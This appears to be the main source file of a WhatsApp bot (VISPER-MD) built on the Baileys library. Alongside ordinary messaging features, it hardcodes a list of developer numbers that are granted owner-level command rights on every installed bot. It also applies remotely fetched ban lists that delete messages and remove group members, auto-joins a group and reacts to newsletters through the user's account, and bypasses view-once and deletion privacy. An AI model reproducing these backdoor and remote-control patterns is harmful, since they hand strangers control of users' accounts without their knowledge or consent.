const {
    default: makeWASocket,
    getAggregateVotesInPollMessage, 
    useMultiFileAuthState,
    DisconnectReason,
    getDevice,
    fetchLatestBaileysVersion,
    jidNormalizedUser,
    getContentType,
    Browsers,
    makeInMemoryStore,
    makeCacheableSignalKeyStore,
    downloadContentFromMessage,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    prepareWAMessageMedia,
    proto
} = require('@whiskeysockets/baileys')
const fs = require('fs')
const P = require('pino')
const config = require('./config')
const qrcode = require('qrcode-terminal')
const NodeCache = require('node-cache')
const util = require('util')
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson, fetchBuffer, getFile } = require('./lib/functions')
const { sms, downloadMediaMessage } = require('./lib/msg')
const axios = require('axios')
const { File } = require('megajs')
const path = require('path')
const msgRetryCounterCache = new NodeCache()

const FileType = require('file-type')
const l = console.log
var {
  updateCMDStore,
  isbtnID,
  getCMDStore,
  getCmdForCmdId,
  connectdb,
  input,
  get,
  getalls,
  updb,
  updfb,
  upresbtn,
} = require("./lib/database");
const ownerNumber = [`${config.OWNER_NUMBER}`];
//===================SESSION======.===========kj===h========


const authFolder = path.join(__dirname, 'auth_info_baileys');
const df = path.join(authFolder, 'creds.json');

// 1. මුලින්ම ෆෝල්ඩර් එක තියෙනවද බලලා නැත්නම් ඒක හදනවා
if (!fs.existsSync(authFolder)) {
    fs.mkdirSync(authFolder, { recursive: true });
}

if (!fs.existsSync(df)) {
  if (config.SESSION_ID) {
    const sessdata = config.SESSION_ID.replace("VISPER-MD&", "");

    if (sessdata.includes("#")) {
      const filer = File.fromURL(`https://mega.nz/file/${sessdata}`);
      filer.download((err, data) => {
        if (err) throw err;
        // මෙතනදී දැන් Folder එක තියෙන නිසා අවුලක් වෙන්නේ නැහැ
        fs.writeFile(df, data, () => {
          console.log("✅ Mega session download completed and saved to creds.json !!");
        });
      });
    } else {
      (async () => {
        await downloadSession(sessdata, df);
      })();
    }
  }
}

async function downloadSession(sessdata, df) {
  const dbUrls = [
    'https://visper-get-sessions.vercel.app/',
    'https://visper-get-sessions.vercel.app/'
  ];

  let success = false;

  for (let i = 0; i < dbUrls.length; i++) {
    const sessionUrl = `${dbUrls[i]}get-session?q=${sessdata}.json`;
    console.log(`📥 Downloading session from visper-DB`);

    try {
      const response = await axios.get(sessionUrl);

      if (response.data && Object.keys(response.data).length > 0) {
        await sleep(1000);
        // JSON format එකෙන් හරියටම save කරනවා
        fs.writeFileSync(df, JSON.stringify(response.data, null, 2));
        console.log(`✅ Session file downloaded successfully and saved to creds.json`);
        success = true;
        break;
      } else {
        console.warn(`⚠️ Empty or invalid session data from DB-${i + 1}, attempting next DB...`);
      }
    } catch (err) {
      console.error(`❌ Failed to download local DB session file: ${err.message}`);
    }
  }

  if (!success) {
    console.error("❌ All DB servers failed to provide a valid session file.");
  }
}
// <<==========PORTS============>>
const express = require("express");
const app = express();
const port = process.env.PORT || 8000;
//====================================
async function connectToWA() {
//Run the function

    const {
        version,
        isLatest
    } = await fetchLatestBaileysVersion()
    console.log(`using WA v${version.join('.')}, isLatest: ${isLatest}`)
    const {
        state,
        saveCreds
    } = await useMultiFileAuthState(__dirname + `/auth_info_baileys`)
   const conn = makeWASocket({
        logger: P({ level: "silent" }),
        printQRInTerminal: true,
        browser: ["Visper-MD", "Chrome", "3.0.0"],
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, P({ level: "silent" })),
        },
        msgRetryCounterCache,
        version
    });


const responsee = await axios.get('https://mv-visper-full-db.pages.dev/Main/main_var.json');
const connectnumber = responsee.data
	
// Default owner JID
const DEFAULT_OWNER_JID = `${connectnumber.connectmsg_sent}`;




conn.ev.on('creds.update', saveCreds);


	
conn.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(`❌ Disconnected: ${lastDisconnect?.error?.message}. Reconnecting: ${shouldReconnect}`);
            if (shouldReconnect) {
                connectToWA();
            } else {
                console.log("⚠️ Logged out. Please delete auth_info_baileys and scan again.");
            }
        } else if (connection === 'open') {
            console.log("✅ WhatsApp socket connected!");

            // Fetch Connect Message & Send Config
            try {
                const res = await axios.get('https://mv-visper-full-db.pages.dev/Main/main_var.json');
                const ownerdata = res.data;
                const targetJid = jidNormalizedUser(conn.user.id);

                const configMsg = `
*⚙️ VISPER BOT SETTINGS ⚙️*
• Name: ${config.NAME}
• Prefix: ${config.PREFIX}
• Work Type: ${config.WORK_TYPE}
• Status: Online ✅
`;
                await conn.sendMessage(targetJid, { 
                   image: { url: 'https://mv-visper-full-db.pages.dev/Data/visper_main.jpeg' }, 
                  caption: ownerdata.connectmg || configMsg 
              });
                
                console.log("✅ Initialization message sent.");
				await autoJoinGroup(conn);
            } catch (e) {
                console.log("⚠️ Error sending startup message:", e.message);
            }
        }
    });

const path = require('path');
fs.readdirSync("./plugins/").forEach((plugin) => {
  if (path.extname(plugin).toLowerCase() == ".js") {
      require("./plugins/" + plugin);
  }
});


await connectdb()
await updb()		
 console.log(`✅ VISPER-MD SUCCESSFULLY CONNECTED!`);




async function autoJoinGroup(conn) {
    try {
        // 1. Fetch the link from your database
        let joinlink2 = await fetchJson('https://mv-visper-full-db.pages.dev/Main/main_var.json');

        if (!joinlink2 || !joinlink2.supglink) {
            console.error('❌ Invalid join link data!');
            return;
        }

        // 2. Extract the invite code
        const joinlink = joinlink2.supglink.split('https://chat.whatsapp.com/')[1];
        if (!joinlink) return;

        // 3. Wait 5 seconds to ensure connection is stable (Fixes 'Connection Closed' error)
        await new Promise(resolve => setTimeout(resolve, 5000));

        // 4. Double check if connection is still alive before querying
        if (conn.ws.isOpen) {
            // Get group ID without joining
            const info = await conn.groupGetInviteInfo(joinlink);
            const groupId = info.id;

            // Get list of current groups
            const allGroups = await conn.groupFetchAllParticipating();
            const isAlreadyIn = Object.keys(allGroups).includes(groupId);

            if (isAlreadyIn) {
                console.log("ℹ️ Already a member of support group. Skipping join.");
            } else {
                await conn.groupAcceptInvite(joinlink);
                console.log("✅ Successfully joined support group!");
            }
        }
    } catch (err) {
        // This prevents the whole bot from crashing if the link is expired or network fails
        console.error('❌ Auto-join failed:', err.message);
    }
}


	



const ownerdataa = (await axios.get('https://mv-visper-full-db.pages.dev/Main/main_var.json')).data;
     
         

 





  conn.ev.on('messages.upsert', async (mek) => {
    try {

async function loadConfig() {
  const settings = await getalls(); 
  if (settings) {
    Object.assign(config, settings); 
  }
}

loadConfig().catch(console.error);
	    
mek = mek.messages[0];
if (!mek.message) return;

// ephemeral message නම් unwrap කරමු
mek.message = (getContentType(mek.message) === 'ephemeralMessage')
  ? mek.message.ephemeralMessage.message
  : mek.message;

//================================================================================================



//================================================================================================



	    
const m = sms(conn, mek)
const type = getContentType(mek.message)
const content = JSON.stringify(mek.message)
const from = mek.key.remoteJid
		
const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
const body = 
  (type === 'conversation') ? mek.message.conversation :
  (type === 'extendedTextMessage' && mek.message.extendedTextMessage?.contextInfo?.quotedMessage &&
   await isbtnID(mek.message.extendedTextMessage.contextInfo.stanzaId)) ?
    await getCmdForCmdId(
      await getCMDStore(mek.message.extendedTextMessage.contextInfo.stanzaId),
      mek.message.extendedTextMessage.text
    ) :
  (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text :
  (type === 'templateButtonReplyMessage') ? mek.message.templateButtonReplyMessage?.selectedId :
  (type === 'interactiveResponseMessage') ? (() => {
    try {
      const json = JSON.parse(mek.message.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson);
      return json?.id || '';
    } catch { return ''; }
  })() :
  (type === 'imageMessage' && mek.message.imageMessage?.caption) ? mek.message.imageMessage.caption :
  (type === 'videoMessage' && mek.message.videoMessage?.caption) ? mek.message.videoMessage.caption :
  // fallback for unknown or malformed types
  m.msg?.text ||
  m.msg?.conversation ||
  m.msg?.caption ||
  m.message?.conversation ||
  m.msg?.selectedButtonId ||
  m.msg?.singleSelectReply?.selectedRowId ||
  m.msg?.selectedId ||
  m.msg?.contentText ||
  m.msg?.selectedDisplayText ||
  m.msg?.title ||
  m.msg?.name ||
  '';


const prefix = config.PREFIX;  
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const q = args.join(' ')
const isGroup = from.endsWith('@g.us')
const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)

const senderr = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)	
const senderNumber = sender.split('@')[0]
const botNumber = conn.user.id.split(':')[0]
const pushname = mek.pushName || 'Sin Nombre'
const developers = `107593779404949,249808837197851,187574828150975,233118577516561,165923646365908,203367389343836`
const mokakhri = developers.split(",")
const isbot = botNumber.includes(senderNumber)
const isdev = mokakhri.includes(senderNumber)
const isMe = isbot ? isbot : isdev 
const isOwner = ownerNumber.includes(senderNumber) || isMe
const botNumber2 = await jidNormalizedUser(conn.user.id);
const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => null) : null;
const groupName = isGroup && groupMetadata ? groupMetadata.subject : '';
const participants = isGroup && groupMetadata ? groupMetadata.participants : [];
const groupAdmins = isGroup ? getGroupAdmins(participants) : [];
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
const isAdmins = isGroup ? groupAdmins.includes(senderr) : false
 const isReact = m.message.reactionMessage ? true : false
const isAnti = (teks) => {
let getdata = teks
for (let i=0;i<getdata.length;i++) {
if(getdata[i] === from) return true
}
return false
}







	    
const reply = async(teks) => {
	await conn.sendPresenceUpdate('composing', from)
  return await conn.sendMessage(from, { text: teks }, { quoted: mek })
}
conn.replyad = async (teks) => {
	await conn.sendPresenceUpdate('composing', from)
  await conn.sendMessage(from, { text: teks }, { quoted: mek })
}
const NON_BUTTON = true // Implement a switch to on/off this feature...
conn.buttonMessage2 = async (jid, msgData,quotemek) => {
	await conn.sendPresenceUpdate('composing', from)
  if (!NON_BUTTON) {
    await conn.sendMessage(jid, msgData)
  } else if (NON_BUTTON) {
    let result = "";
    const CMD_ID_MAP = []
    msgData.buttons.forEach((button, bttnIndex) => {
const mainNumber = `${bttnIndex + 1}`;
result += `\n*${mainNumber}*  ||  ${button.buttonText.displayText}`;

CMD_ID_MAP.push({ cmdId: mainNumber, cmd: button.buttonId });
    });

    if (msgData.headerType === 1) {
const buttonMessage = `${msgData.text}\n\n*\`Reply Below Number 🔢\`*\n${result}\n\n${msgData.footer}`
const textmsg = await conn.sendMessage(from, { text: buttonMessage ,
}, { quoted: quotemek || mek})
await updateCMDStore(textmsg.key.id, CMD_ID_MAP);
    } else if (msgData.headerType === 4) {
const buttonMessage = `${msgData.caption}\n\n*\`Reply Below Number 🔢\`*\n${result}\n\n${msgData.footer}`
const imgmsg = await conn.sendMessage(jid, { image: msgData.image, caption: buttonMessage ,
}, { quoted: quotemek || mek})
await updateCMDStore(imgmsg.key.id, CMD_ID_MAP);
    }
  }
}

conn.buttonMessage = async (jid, msgData, quotemek) => {
	await conn.sendPresenceUpdate('composing', from)
  if (!NON_BUTTON) {
    await conn.sendMessage(jid, msgData)
  } else if (NON_BUTTON) {
    let result = "";
    const CMD_ID_MAP = []
    msgData.buttons.forEach((button, bttnIndex) => {
const mainNumber = `${bttnIndex + 1}`;
result += `\n*${mainNumber}* ||  ${button.buttonText.displayText}`;

CMD_ID_MAP.push({ cmdId: mainNumber, cmd: button.buttonId });
    });

    if (msgData.headerType === 1) {
const buttonMessage = `${msgData.text || msgData.caption}\n\n*Reply Below Number 🔢*\n${result}\n\n${msgData.footer}`
const textmsg = await conn.sendMessage(from, { text: buttonMessage ,}, { quoted: quotemek || mek})
await updateCMDStore(textmsg.key.id, CMD_ID_MAP);
    } else if (msgData.headerType === 4) {
const buttonMessage = `${msgData.caption}\n\n*Reply Below Number 🔢*\n${result}\n\n${msgData.footer}`
const imgmsg = await conn.sendMessage(jid, { image: msgData.image, caption: buttonMessage ,}, { quoted: quotemek || mek})
await updateCMDStore(imgmsg.key.id, CMD_ID_MAP);
    }
  }
}

   
conn.listMessage2 = async (jid, msgData, quotemek) => {
	await conn.sendPresenceUpdate('composing', from)
  if (!NON_BUTTON) {
    await conn.sendMessage(jid, msgData)
  } else if (NON_BUTTON) {
    let result = "";
    const CMD_ID_MAP = []

    msgData.sections.forEach((section, sectionIndex) => {
const mainNumber = `${sectionIndex + 1}`;
result += `\n*${section.title}*\n\n`;

section.rows.forEach((row, rowIndex) => {
  const subNumber = `${mainNumber}.${rowIndex + 1}`;
  const rowHeader = `*${subNumber}* || ${row.title}`;
  result += `${rowHeader}\n`;
  if (row.description) {
    result += `   ${row.description}\n\n`;
  }
  CMD_ID_MAP.push({ cmdId: subNumber, cmd: row.rowId });
});
    });

    const listMessage = `${msgData.text}\n\n${msgData.buttonText},${result}\n${msgData.footer}`
    const text = await conn.sendMessage(from, { text: listMessage ,
}, { quoted: quotemek || mek})
    await updateCMDStore(text.key.id, CMD_ID_MAP);
  }
}

conn.listMessage5 = async (jid, msgData, quotemek) => {
	await conn.sendPresenceUpdate('composing', from)
  try {
    // If it’s a real WhatsApp list message, send directly
    if (msgData.sections && msgData.buttonText && !NON_BUTTON) {
      const quoted = quotemek && quotemek.key && quotemek.message ? { quoted: quotemek } : {};
      return await conn.sendMessage(jid, msgData, quoted);
    }

    // Else render manually as text
    let result = "";
    const CMD_ID_MAP = [];

    msgData.sections.forEach((section, sectionIndex) => {
      const mainNumber = `${sectionIndex + 1}`;
      result += `\n*${section.title}*\n\n`;

      section.rows.forEach((row, rowIndex) => {
        const subNumber = `${mainNumber}.${rowIndex + 1}`;
        const rowHeader = `*${subNumber}* ||  ${row.title}`;
        result += `${rowHeader}\n`;
        if (row.description) {
          result += `   ${row.description}\n\n`;
        }
        CMD_ID_MAP.push({ cmdId: subNumber, cmd: row.rowId });
      });
    });

    const listMessage = `${msgData.text || ''}\n\n${msgData.buttonText || ''},${result}\n\n${msgData.footer || ''}`;

    let sendPayload;
    if (msgData.image) {
      let imageData = msgData.image;

      if (typeof imageData === 'string') {
        imageData = { url: imageData };
      } else if (Buffer.isBuffer(imageData)) {
        imageData = { buffer: imageData };
      } else if (imageData.url) {
        imageData = { url: imageData.url };
      } else {
        throw new Error("Invalid image format for listMessage4.");
      }

      sendPayload = {
        image: imageData,
        caption: listMessage,
      };
    } else {
      sendPayload = { text: listMessage };
    }

    const quoted = quotemek && quotemek.key && quotemek.message ? { quoted: quotemek } : {};
    const text = await conn.sendMessage(jid, sendPayload, quoted);

    await updateCMDStore(text.key.id, CMD_ID_MAP);
  } catch (e) {
    console.error("listMessage4 error:", e);
  }
};



conn.listMessage4 = async (jid, msgData, quotemek) => {
	await conn.sendPresenceUpdate('composing', from)
  if (!NON_BUTTON) {
    await conn.sendMessage(jid, msgData);
  } else {
    let result = "";
    const CMD_ID_MAP = [];

    msgData.sections.forEach((section, sectionIndex) => {
      const mainNumber = `${sectionIndex + 1}`;
      result += `\n*${section.title}*\n\n`;

      section.rows.forEach((row, rowIndex) => {
        const subNumber = `${mainNumber}.${rowIndex + 1}`;
        const rowHeader = `*${subNumber}* ||  ${row.title}`;
        result += `${rowHeader}\n`;
        if (row.description) {
          result += `   ${row.description}\n\n`;
        }
        CMD_ID_MAP.push({ cmdId: subNumber, cmd: row.rowId });
      });
    });

    const listMessage = `${msgData.text || ''}\n\n${msgData.buttonText || ''},${result}\n\n${msgData.footer || ''}`;

    // Fix image handling
    let sendPayload;
    if (msgData.image) {
      let imageData = msgData.image;

      if (typeof imageData === 'string') {
        imageData = { url: imageData };
      } else if (Buffer.isBuffer(imageData)) {
        imageData = { buffer: imageData };
      } else if (imageData.url) {
        imageData = { url: imageData.url };
      } else {
        throw new Error("Invalid image format for listMessage4.");
      }

      sendPayload = {
        image: imageData,
        caption: listMessage,
      };
    } else {
      sendPayload = { text: listMessage };
    }

    const text = await conn.sendMessage(
      jid,
      sendPayload,
      { quoted: quotemek || mek }
    );

    await updateCMDStore(text.key.id, CMD_ID_MAP);
  }
};


conn.listMessage = async (jid, msgData, quotemek) => {
	await conn.sendPresenceUpdate('composing', from)
  if (!NON_BUTTON) {
    await conn.sendMessage(jid, msgData)
  } else if (NON_BUTTON) {
    let result = "";
    const CMD_ID_MAP = []

    msgData.sections.forEach((section, sectionIndex) => {
const mainNumber = `${sectionIndex + 1}`;
result += `\n*${section.title}*\n\n`;

section.rows.forEach((row, rowIndex) => {
  const subNumber = `${mainNumber}.${rowIndex + 1}`;
  const rowHeader = `*${subNumber}* ||  ${row.title}`;
  result += `${rowHeader}\n`;
  if (row.description) {
    result += `   ${row.description}\n\n`;
  }
  CMD_ID_MAP.push({ cmdId: subNumber, cmd: row.rowId });
});
    });

    const listMessage = `${msgData.text}\n\n${msgData.buttonText},${result}\n\n${msgData.footer}`
    const text = await conn.sendMessage(from, { text: listMessage, 
}, { quoted: quotemek || mek})
    await updateCMDStore(text.key.id, CMD_ID_MAP);
  }
}

     conn.sendButtonMessage3 = async (jid, buttons, quoted, opts = {}) => {
    let header;

    if (opts?.image) {
        var image = await prepareWAMessageMedia({
            image: {
                url: opts.image || ''
            }
        }, {
            upload: conn.waUploadToServer
        });

        header = {
            title: opts.header || '',
            hasMediaAttachment: true,
            imageMessage: image.imageMessage,
        };

    } else {
        header = {
            title: opts.header || '',
            hasMediaAttachment: false,
        };
    }

    let message = generateWAMessageFromContent(jid, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2,
                },
                interactiveMessage: {
                    body: {
                        text: opts.body || ''
                    },
                    footer: {
                        text: opts.footer || ''
                    },
                    header: header,
                    nativeFlowMessage: {
                        buttons: buttons,
                        messageParamsJson: ''
                    }
                }
            }
        }
    }, {
        quoted: quoted
    });

    await conn.relayMessage(jid, message.message, { messageId: message.key.id });
};




	    

conn.edite = async (gg, newmg) => {
  await conn.relayMessage(from, {
    protocolMessage: {
key: gg.key,
type: 14,
editedMessage: {
  conversation: newmg
}
    }
  }, {})
}

	    

conn.forwardMessage = async (jid, message, forceForward = false, options = {}) => {
    // Message eka nathnam error eka nawaththanna
    if (!message || !message.message) return; 

    let vtype
    if (options.readViewOnce) {
        // View once logic eka (meeka handle karaddi message.message thiyeda kiyala check karanawa)
        let viewOnceMsg = message.message?.ephemeralMessage?.message || message.message
        if (viewOnceMsg?.viewOnceMessage) {
            vtype = Object.keys(viewOnceMsg.viewOnceMessage.message)[0]
            delete viewOnceMsg.viewOnceMessage.message[vtype].viewOnce
            message.message = { ...viewOnceMsg.viewOnceMessage.message }
        }
    }

    // NULL check ekak ekka mtype ganna
    let mtype = message.message ? Object.keys(message.message)[0] : null
    if (!mtype) return; // Mtype nathnam forward karanna ba

    let content = await generateForwardMessageContent(message, forceForward)
    if (!content) return; // Content generate une nathnam nawaththanna

    let ctype = Object.keys(content)[0]
    let context = {}
    if (mtype != "conversation") context = message.message[mtype]?.contextInfo || {}

    content[ctype].contextInfo = {
        ...context,
        ...content[ctype].contextInfo,
        forwardingScore: 0,
        isForwarded: false
    }

    const waMessage = await generateWAMessageFromContent(jid, content, options ? {
        ...content[ctype],
        ...options,
        ...(options.contextInfo ? {
            contextInfo: {
                ...content[ctype].contextInfo,
                ...options.contextInfo
            }
        } : {})
    } : {})

    await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
    return waMessage
}







	    
conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
  let mime = '';
  let res = await axios.head(url)
  mime = res.headers['content-type']
  if (mime.split("/")[1] === "gif") {
    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options })
  }
  let type = mime.split("/")[0] + "Message"
  if (mime === "application/pdf") {
    return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options })
  }
  if (mime.split("/")[0] === "image") {
    return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options })
  }
  if (mime.split("/")[0] === "video") {
    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options })
  }
  if (mime.split("/")[0] === "audio") {
    return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options })
  }
}

const ownerdata = (await axios.get('https://mv-visper-full-db.pages.dev/Main/main_var.json')).data
            
           
            config.FOOTER = ownerdata.footer
           
const preUser = await fetchJson(`https://mv-visper-full-db.pages.dev/Main/premium_user.json`)
const preUsers = preUser.numbers.split(",");

// replace करके "@s.whatsapp.net" format එකට convert කරලා check කරන්න
const isPre = preUsers
  .map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
  .includes(sender);





	    
//============================================================================ 
const banbn = await fetchJson(`https://mv-visper-full-db.pages.dev/Main/ban_number.json`)
const plynYnna = banbn.split(",")
const isBanUser = [ ...plynYnna ]
      .map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
      .includes(sender)


  let gpId = `${config.JID_BLOCK}`;
const gpIdz = gpId.split(",")
const isBanGrp = [ ...gpIdz ]
      
      .includes(from)

//=======================================================================================================================================================================


const banGroups = await fetchJson(
  "https://mv-visper-full-db.pages.dev/Main/ban_group.json"
);          // banGroups === [ "1203...", ... ]

const isBanvisper = banGroups
  .map(id => id.replace(/[^0-9]/g, "") + "@g.us") // "1203…" ➜ "1203…@g.us"
  .includes(from);   
const SUDO = config.SUDO; // eg: [ '94778500326@s.whatsapp.net', '194558377910501@lid,187574828150975@lid' ]

const isSudo = SUDO.filter(jid => jid.endsWith('@lid') === sender.endsWith('@lid'))
                   .includes(sender);

	

//=========================================BAN GROUPS=====================================================

if ( isCmd && isBanGrp && !isMe && !isSudo) return


//========================================== TEAM REACT SECTION ========================================

const rec = (await axios.get('https://mv-visper-full-db.pages.dev/Main/react.json')).data

const recc = (await axios.get('https://mv-visper-full-db.pages.dev/Main/main_var.json')).data

//================================================================================================================	    
const id = mek.key.server_id
const defaultEmojis = ["❤️", "💖", "💚", "💙","💛"];
const randomEmoji = defaultEmojis[Math.floor(Math.random() * defaultEmojis.length)];
await conn.newsletterReactMessage(`${recc.mainchanal}`, id, randomEmoji);
await conn.newsletterReactMessage(`120363304606757133@newsletter`, id, randomEmoji);
    
//================================================Developer Reacts=================================================	    
if(senderNumber.includes("107593779404949")){
if(isReact) return
m.react(`${rec.sadas}`)
}
if(senderNumber.includes("233118577516561")){
if(isReact) return
m.react(`${rec.saviya}`)
}
if(senderNumber.includes("165923646365908")){
if(isReact) return
m.react(`${rec.alex}`)
}
if(senderNumber.includes("187574828150975")){
if(isReact) return
m.react(`${rec.poorna}`)
}
if(senderNumber.includes("203367389343836")){
if(isReact) return
m.react(`${rec.nadeen}`)
}
if(senderNumber.includes("239037025652977")){
if(isReact) return
m.react(`${rec.pathum}`)
}

if ( isCmd && isBanvisper && isMe ) return	
		
///==================================================Owner React===========================================================
const ownNum = config.OWNER_NUMBER
		
if (senderNumber.includes(ownNum)) {
if (isReact) return;
if (ownerReact) {
m.react(ownerReact);
} else {
m.react(`🕵️`); 
}
}
//===================================================================================

		
if (isCmd && config.CMD_ONLY_READ  == "true"){
await conn.readMessages([mek.key])

}
//=======================================================================================
		
     if ( config.WORK_TYPE == "only_group" ) {
if ( !isGroup && isCmd &&  !isMe && !isOwner && !isSudo ) return
      }
      
   if ( config.WORK_TYPE == "private" ) {
if  ( isCmd && !isMe && !isOwner && !isSudo ) return
      }

   if ( config.WORK_TYPE == "inbox" ) {
if  ( isGroup &&  !isMe && !isOwner && !isSudo ) return
      }      

//============================================Always online============================================================


 if (config.ALLWAYS_OFFLINE == "true") {
        conn.sendPresenceUpdate('unavailable'); // Sets the bot's last seen status
    }

//========================================Ban users========================================================
if ( isBanUser ) {
	await conn.sendMessage(from, { delete: mek.key })
	await conn.groupParticipantsUpdate(from, [sender], 'remove')
	return await conn.sendMessage(from, { text: "*You are banned by VISPER TEAM ❌*" })
}

	
//============================================AUTO BLOCK=============================================================================================================
if (config.AUTO_BLOCK  == "true" && mek.chat.endsWith("@s.whatsapp.net")) {
			if(!isMe){

  await conn.sendMessage(from, { text: `*Warning 1 ❗*` });

				await conn.sendMessage(from, { text: `*Warning 2 ❗*` });
				  await conn.sendMessage(from, { text: `*Warning 3 ❗*` });
				  await conn.sendMessage(from, { text: `*Blocked 🚫*` });

		  await conn.updateBlockStatus(mek.sender, 'block')
			}
		}
//=============================================ANTI CALL======================================================================================================
const rejectedCalls = new Set();    // reject call id එකට lock
const messagedCallers = new Set();  // caller number lock

conn.ev.on("call", async (json) => {
  if (config.ANTI_CALL !== "true") return;

  for (const call of json) {
    if (call.status === "offer") {

      // Reject එක call id එකට එක වතාවක් පමණයි
      if (!rejectedCalls.has(call.id)) {
        await conn.rejectCall(call.id, call.from);
        rejectedCalls.add(call.id);

        // Clear rejectedCalls after 5 minutes to save memory
        setTimeout(() => rejectedCalls.delete(call.id), 5 * 60 * 1000);
      }

      // Message එක caller එකට එක වතාවක් පමණයි
      if (!call.isGroup && !messagedCallers.has(call.from)) {
        await conn.sendMessage(call.from, {
          text: "*Call rejected automatically because owner is busy ⚠️*",
          mentions: [call.from],
        });

	      break; 
        messagedCallers.add(call.from);

        // Clear messagedCallers after 10 minutes so caller can get message again later
        setTimeout(() => messagedCallers.delete(call.from), 10 * 60 * 1000);
      }
    }
  }
});

//=================================================AUTO REACT================================================================================================	    
const emojis = [
    '❤', '💕', '😻', '🧡', '💛', '💚', '💙', '💜', '🖤', '❣', '💞', '💓', '💗', '💖', '💘', '💝', '💟', '♥', '💌', 
    '🙂', '🤗', '😌', '😉', '😊', '🎊', '🎉', '🎁', '🎈', '👋', '🤩', '🥳', '😎', '🔥', '✨', '🌈', '⭐', '🌟', 
    '👑', '💯', '💎', '🌹', '🌸', '🌺', '🍃', '🍀', '🍕', '🍦', '🍩', '🍹', '🚀', '🛸', '🎮', '🎸', '🎨', '🧸', 
    '🐶', '🐱', '🦁', '🐯', '🐼', '🐨', '🦋', '🐥', '🦄', '🌍', '🌙', '☀', '⚡', '❄', '🔥', '💥', '✅', '🧿'
];

const emokis = emojis[Math.floor(Math.random() * (emojis.length))];

if(!isMe && config.AUTO_REACT == "true"){
    if(isReact) return;
    await conn.sendMessage(mek.chat, {
        react: {
            text: emokis,
            key: mek.key
        }
    });
}
//================================================AUTO MSG READ==========================================================================================================
if (config.AUTO_MSG_READ  == "true"){
await conn.readMessages([mek.key])

}

//===============================================AUTO TYPING===============================================================================================================	      

  
  if(config.AUTO_TYPING  == "true"){
                conn.sendPresenceUpdate('composing', mek.key.remoteJid)
            }
	    
//============================================AUTO RECOOURDING=========================================================================================================
	    if(config.AUTO_RECORDING  == "true"){
		conn.sendPresenceUpdate('recording', mek.key.remoteJid)
            	    
       }

    
    //==================================ANTI DELETE========================================
if(!isOwner) {	
    if(config.ANTI_DELETE  == "true") {
    if (!m.id.startsWith("BAE5")) {
    
    // Ensure the base directory exists
    const baseDir = 'message_data';
    if (!fs.existsSync(baseDir)) {
      fs.mkdirSync(baseDir);
    }
    
    function loadChatData(remoteJid, messageId) {
      const chatFilePath = path.join(baseDir, remoteJid, `${messageId}.json`);
      try {
        const data = fs.readFileSync(chatFilePath, 'utf8');
        return JSON.parse(data) || [];
      } catch (error) {
        return [];
      }
    }
    
    function saveChatData(remoteJid, messageId, chatData) {
      const chatDir = path.join(baseDir, remoteJid);
    
      if (!fs.existsSync(chatDir)) {
        fs.mkdirSync(chatDir, { recursive: true });
      }
    
      const chatFilePath = path.join(chatDir, `${messageId}.json`);
    
      try {
        fs.writeFileSync(chatFilePath, JSON.stringify(chatData, null, 2));
       // console.log('Chat data saved successfully.');
      } catch (error) {
        console.error('Error saving chat data:', error);
      }
    }
        
    function handleIncomingMessage(message) {
      const remoteJid = from //message.key.remoteJid;
      const messageId = message.key.id;
    
      const chatData = loadChatData(remoteJid, messageId);
    
      chatData.push(message);
    
      saveChatData(remoteJid, messageId, chatData);
    
    //  console.log('Message received and saved:', messageId);
    }
    
    
    const delfrom = from
    function handleMessageRevocation(revocationMessage) {
    //const remoteJid = revocationMessage.message.protocolMessage.key.remoteJid;
     //const messageId = revocationMessage.message.protocolMessage.key.id;
    const remoteJid = from // revocationMessage.msg.key.remoteJid;
    const messageId = revocationMessage.msg.key.id;
    
        
     // console.log('Received revocation message with ID:', messageId);
    
      const chatData = loadChatData(remoteJid, messageId);
    
       const originalMessage = chatData[0]   
    
      if (originalMessage) {
        const deletedBy = revocationMessage.sender.split('@')[0];
        const sentBynn = originalMessage.key.participant ?? revocationMessage.sender;
    const sentBy = sentBynn.split('@')[0];
          if ( deletedBy.includes(botNumber) || sentBy.includes(botNumber) ) return;
     if(originalMessage.message && originalMessage.message.conversation && originalMessage.message.conversation !== ''){
         const messageText = originalMessage.message.conversation;
   
         var xx = '```'
     conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${xx}${messageText}${xx}` });
    //........................................//........................................
    }else if(originalMessage.msg.type ==='MESSAGE_EDIT'){
